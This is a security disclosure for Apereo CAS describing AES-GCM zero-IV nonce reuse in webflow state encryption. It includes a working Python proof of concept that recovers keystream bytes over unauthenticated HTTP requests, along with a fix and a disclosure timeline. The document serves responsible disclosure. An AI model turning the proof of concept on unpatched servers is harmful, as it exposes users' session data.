

# AES-GCM zero IV nonce reuse in webflow state encryption

https://github.com/apereo/cas/

## Email Report
I am reporting a cryptographic vulnerability in the webflow conversation state encryption that allows an unauthenticated attacker to recover plaintext from any user's session state.

The issue is in BaseBinaryCipherExecutor.buildParameterSpec() (cas-server-core-util-api). When the encryption key size is 16 bytes (the default for the webflow cipher), the AES-GCM IV is set to new byte[16], which is all zeros in Java. The same (key, IV) pair is used for every call to encode(), which means every webflow state blob on the server shares an identical keystream for the server's lifetime.

AES-GCM with a repeated nonce is equivalent to a stream cipher with a fixed keystream. Two ciphertexts XOR to the XOR of their plaintexts. Since both plaintexts are gzip-compressed, they share the same 10-byte gzip header, giving an attacker an immediate known-plaintext to recover the first 10 keystream bytes. More known-plaintext can be obtained by submitting controlled login attempts, progressively extending keystream recovery.

The webflow execution token is embedded in the GET /cas/login response with no authentication required, so an attacker needs only two HTTP requests to perform the initial XOR, and additional requests to extend coverage.

Affected component: BaseBinaryCipherExecutor.buildParameterSpec() in cas-server-core-util-api
Affected versions: confirmed 7.3.7.2 and source HEAD (8.0.0-SNAPSHOT)
Default trigger: default key size of 16 (EncryptionRandomizedCryptoProperties.keySize = 16)
Default exposure: client-side webflow storage enabled by default (cas.webflow.session.storage=false)

Proof-of-concept (Python 3, requests):

  Prerequisites: pip install requests; CAS running at https://<host>/cas

  import base64, json, re, requests
  requests.packages.urllib3.disable_warnings()

  CAS_URL = "https://<host>/cas"
  HDRS    = {"Host": "<host>"}

  def b64dec(s):
      s += '=' * (-len(s) % 4); return base64.urlsafe_b64decode(s)

  def ct(key):
      _, jwt = key.split('_', 1)
      parts = b64dec(jwt).decode('utf-8', errors='replace').split('.')
      return b64dec(parts[1])[:-16]

  def key_from(url):
      r = requests.get(url, headers=HDRS, verify=False)
      return re.search(r'name="execution" value="([^"]+)"', r.text).group(1)

  ka = ct(key_from(f"{CAS_URL}/login"))

  s = requests.Session()
  ki = key_from(f"{CAS_URL}/login")
  requests.Session().post(f"{CAS_URL}/login", headers=HDRS, verify=False,
      data={'username':'x','password':'x','execution':ki,'_eventId':'submit','geolocation':''})
  s2 = requests.Session()
  s2.get(f"{CAS_URL}/login", headers=HDRS, verify=False)
  r2 = s2.post(f"{CAS_URL}/login", headers=HDRS, verify=False,
      data={'username':'x','password':'x','execution':ki,'_eventId':'submit','geolocation':''})
  kb = ct(re.search(r'name="execution" value="([^"]+)"', r2.text).group(1))

  xor10 = bytes(a^b for a,b in zip(ka[:10], kb[:10]))
  gzip  = bytes([0x1f,0x8b,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x03])
  K     = bytes(c^p for c,p in zip(ka[:10], gzip))
  pb    = bytes(k^c for k,c in zip(K, kb[:10]))

  print("XOR[0:10]:", xor10.hex())     # 00000000000000000000
  print("K[0:10]:  ", K.hex())          # 9efb151b6984e4604b73
  print("P_b[0:10]:", pb.hex())         # 1f8b0800000000000003  (gzip magic)
  print("Confirmed:", pb == gzip)       # True

Observed output:
  XOR[0:10]: 00000000000000000000
  K[0:10]:   9efb151b6984e4604b73
  P_b[0:10]: 1f8b0800000000000003
  Confirmed: True

Recommended fix: replace the fixed zero IV with a random 12-byte (96-bit) IV generated per encryption call and prepend it to the ciphertext for decryption. The standard AES-GCM approach is:

  byte[] iv = new byte[12];
  new SecureRandom().nextBytes(iv);
  GCMParameterSpec spec = new GCMParameterSpec(128, iv);
  // prepend iv to ciphertext; on decryption, read first 12 bytes as IV

Alternatively, increasing the key size to above 32 bytes in the webflow crypto properties triggers the existing branch that derives the IV from the key, which avoids the zero IV but still reuses the same IV across calls (a separate concern).

Affected Version: 7.3.7.2

## Disclosure
 - 16 June 2026 - reported via email
 - 17 June 2026 - maintainer requested retest with 7.3.8-SNAPSHOT
 - 17 June 2026 - retested based on freshly built docker and it's fixed
 - 18 June 2026 - maintainer offered credit (I didn't provide personal info and remained anonymous) - https://apereo.github.io/2026/06/18/vuln/

   <img width="644" height="113" alt="image" src="https://github.com/user-attachments/assets/85c63ed6-b157-4526-813a-c96633dae494" />

   <img width="1531" height="1212" alt="image" src="https://github.com/user-attachments/assets/4d0da464-f77c-4cd6-99db-89d301bef78b" />


